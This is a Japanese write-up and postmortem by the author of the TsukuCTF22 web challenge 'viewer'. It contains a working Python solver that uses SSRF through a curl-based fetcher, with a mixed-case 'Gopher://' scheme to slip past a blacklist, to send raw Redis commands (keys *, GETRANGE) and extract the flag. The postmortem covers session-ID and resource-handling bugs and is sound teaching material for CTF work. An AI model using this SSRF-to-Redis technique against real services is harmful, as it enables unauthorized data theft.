---
title: viewer
description: Writeups for TsukuCTF21 have been published. Check them out if you'd like!
author: task4233
genre: Web
solver: 8
point: 500
---

# viewer

## はじめに

本問題で配布されたコードの一部に実装不備があり参加者体験を悪くしてしまったことを、CTF 終了後に幾つかのブログ記事やツイートから知りました。この件に関して、万全の問題提供ができなかったことをお詫び申し上げます。

再発防止のために配布されるコードと本番環境のコードに差異を生まないようレビュー段階で注意する予定です。そして、参加者の皆様にとってより良い CTF にするためにも、不審な点などがあれば Discord の#ask-to-admin でご確認いただけると非常にありがたいです。よろしくお願いします。

また、これに伴い簡単なポストモーテムを行ったため Writeup 末尾に追記します。本件に興味がある方はご覧ください。

## 問題文

Writeups for TsukuCTF21 have been published.
Check them out if you'd like!

## 難易度

Medium

## 解法

配布されているソースコードを読むと、redis の中に FLAG が含まれていることが分かる。  
curl で redis ということは別プロトコルを利用した SSRF が思い浮かぶ。  
Flag が存在している場所は`app.py` 上か redis 内部であるため、いずれかの情報を抜き取りたい。  
前者は `file://` scheme、後者は `gopher://` や`dict://` scheme を利用することになりそうだ。

しかし、前者は以下の `response_sanitizer` によってサニタイズされるため、後者を利用することにする。

```python
# app.py
# a response is also sanitized just in case because the flag is super sensitive information.
blacklist_in_response = ['TsukuCTF22']

def response_sanitizer(body: str) -> str:
    if any([scheme in body for scheme in blacklist_in_response]):
        return "SANITIZED: a sensitive data is included!"
    return body
```

`gopher://` 等は禁止されているように見えるが、case-insensitive なので大文字を含めることで回避できる。

ただし、gopher で対象の value を取るために、redis の key を知る必要がある。  
key は redis の `keys *` で全列挙できるため、全ての key を列挙して response に flag が含まれるものを選択すれば良い。

また、`TsukuCTF22`という文字列を含む場合は sanitize されるが、`GETRANGE` で一部を抜き出すことで対処できる。  
したがって、方針は以下の通りになる。  
まず、redis に含まれる key を全列挙し、次に GETRANGE で列挙したものの一部を読み取る。

solver は以下の通り。

```python
import requests
from urllib.parse import quote
import re
import sys

# CHANGE HERE with an appropriate url
TARGET_URL = "http://127.0.0.1:31555"

# enumerate redis keys
form = {
    "url": "Gopher://redis:6379/+" + quote("keys *\r\nQUIT\r\n")
}
cookies = {
    "__SESSION_ID": "d8c7d141-b8da-416b-a220-d8d7218c8bbc", # dummy session id
}
res = requests.post(TARGET_URL, data=form, cookies=cookies)

session_id_list = re.findall("(.+-.+-.+-.+-.+)\r", res.text)
# print(session_id_list)

# check redis value
for session_id in session_id_list:
    form["url"] = "Gopher://redis:6379/+" + quote(f"GETRANGE {session_id} 60 -1\r\nQUIT\r\n")
    cookies["__SESSION_ID"] = session_id
    res = requests.post(TARGET_URL, data=form, cookies=cookies)
    if "CTF22{" in res.text:
        print("TsukuCTF22{" + res.text[res.text.find("CTF22{") + len("CTF22{"):res.text.find("}&#34;")] + "}")
        sys.exit(0)

```

上記のソルバを実行すると、以下の Flag が得られる。

```
TsukuCTF22{ur1_scheme_1s_u5efu1}
```

## ポストモーテム

### 何が起こったか

前提として、実装コードに不備があったために、問題にアクセスする時に Cookie に格納される `__SESSION_ID` が共有されているという問題がありました。

本来であればこの問題により Flag が取得できないはずです。しかし、配布されたコードと本番環境のコードの Flag を Redis に追加する部分に差異があったために、配布されたコードで構築できる環境によっては Flag が取得できないにも拘らず、本番環境では Flag が取得できるという現象が起きました。

実際に本番中はソルバによって Flag が取得できることのみを確認していたため、この問題に気づけませんでした。

### 技術的詳細

コードを用いて具体的に説明します。

まず、以下が配布されたコードで Flag を Redis に追加する部分のコードです。

```python
# initialization
redis = redis.Redis(host='redis', port=6379, db=0)
flag = "TsukuCTF22{dummy flag}" # the flag is replaced a real flag in a production environment.
id = str(uuid.uuid4())
redis.set(id, json.dumps({"id": id, "name": flag}))
```

これにより、UUIDv4 を ID とした Flag を含むデータが Redis に登録されます。

しかし、アカウント登録の部分にて以下の通りその ID に対して上書きが行われます。

```python
    redis.set(id, json.dumps({"id": str(uuid.uuid4()), "name": name}))
    redis.expire(id, 100)
```

その結果、Redis に登録された Flag が名前で上書きされてしまいます。

詳しくは[mopi さんのブログ](https://mopisec.hatenablog.com/entry/2022/10/24/180123#viewer-8-solves-not-solved)にて検証されているためご覧ください。検証までブログに掲載してくださった mopi さん、ありがとうございました :pray:

---

一方、以下が本番環境のコードで Flag を Redis に追加する部分のコードです。

```python
# user session information
redis = redis.Redis(host='redis', port=6379, db=0)
users = ['frt', 'ny_a', 'satoki', 'shio', 'taisyo', 'task', "TsukuCTF22{ur1_scheme_1s_u5efu1}", 'toto', 'xryuseix', 'y-chan', 'yu1k', 'yoshimi', 'ling', 'momoka', 'taru', 'imino']
for user in users:
    id = str(uuid.uuid4())
    redis.set(id, json.dumps({"id": id, "name": user}))
```

`id` はループでイテレートされているため、`id`が変更されるのは最後のユーザのみになります。そのため、本番環境では Flag の上書きが発生しませんでした。

### 根本原因

**根本原因はユーザ登録を行う id 用の UUIDv4 を再生成していなかったこと** にあります。その影響で、配布されたコードで構築される環境では、Redis に追加された Flag が上書きされてしまい取得することが不可能になります。

しかし、上記の通り、**本番環境では Redis にダミーデータを含めて Flag を挿入していたために、Flag が上書きされずに取得できていました**。この差異は作問時から含まれていましたが、作問時には作問方針と解法の流れのみがレビューされていたために、この問題に気づけませんでした。

また、本番中は約 1 時間ごとに 1 回ソルバを回して Flag が得られることのみを確認していたために、配布ファイルには気を配れていませんでした。

### 解決

以下の通り `id` を生成してから登録することで、正しい実装になります。

```python
    id = uuid.uuid4()
    redis.set(id, json.dumps({"id": str(id), "name": name}))
    redis.expire(id, 100)
```

### 影響

影響を受けたユーザは全ユーザです。一応、本件に関して言及してくださったブログやツイートを載せておきます。

- [TsukuCTF 2022 Writeup](https://mopisec.hatenablog.com/entry/2022/10/24/180123#viewer-8-solves-not-solved)
- [ツイート 1](https://twitter.com/zeosutt/status/1584214650853683200)
- [ツイート 2](https://twitter.com/shinobe179/status/1584574685718585344)

### 対応者

問題が発覚したのは CTF 終了後だったため、本番中の対応者はいません。

### 追記

実装に関して、他にも修正すべき点がいくつかあったので以下に記載しておきます。

**Exception が起きた時に PycURL のコネクションが close されない**

配布ファイルは以下のようになっており、PycURL で `c.perform()` 実行時に Exception が発生した場合は `c.close()` が呼ばれません。

```python
        buf = BytesIO()
        try:
            c = pycurl.Curl()
            c.setopt(c.URL, url)
            c.setopt(c.WRITEDATA, buf)
            c.perform()
            c.close()

            body = buf.getvalue().decode('utf-8')
        except Exception as e:
            traceback.print_exc()
            abort("error occurs")
```

したがって、以下の通り `finally` 句を利用するべきです。

```python
        buf = BytesIO()
        c = None
        try:
            c = pycurl.Curl()
            c.setopt(c.URL, url)
            c.setopt(c.WRITEDATA, buf)
            c.perform()

            body = buf.getvalue().decode('utf-8')
        except Exception as e:
            traceback.print_exc()
            abort("error occurs")
        finally:
            c.close()
```

**PycURL のタイムアウトが設けられていない**

PycURL はデフォルトで 300[s]のコネクションタイムアウトを持っていますが、今回のアプリケーションの要件には長すぎです。今回の問題では得られた Redis の key に対して全探索を行う必要があり、コネクションが集中することは容易に想定できるため、タイムアウトは 10[s]くらいに設定しておいても良かったのではないかと思いました。

### おわりに

この度は、作問者の実装不備によって、参加者体験を悪くしてしまったことを深くお詫び申し上げます。
今後はレビュー時に解法の方針やフラグチェック用のソルバだけでなく、配布ファイルにも気を配ってレビューする予定です。

また、他の参加者も含めたより良い CTF 体験のために、Discord での#ask-to-admin にてお問い合わせいただくなどのご協力をお願いいたします。

## 参考資料

- [ポストモーテムテンプレート - PagerDuty](https://ueokande.github.io/incident-response-docs-ja/after/post_mortem_template/)
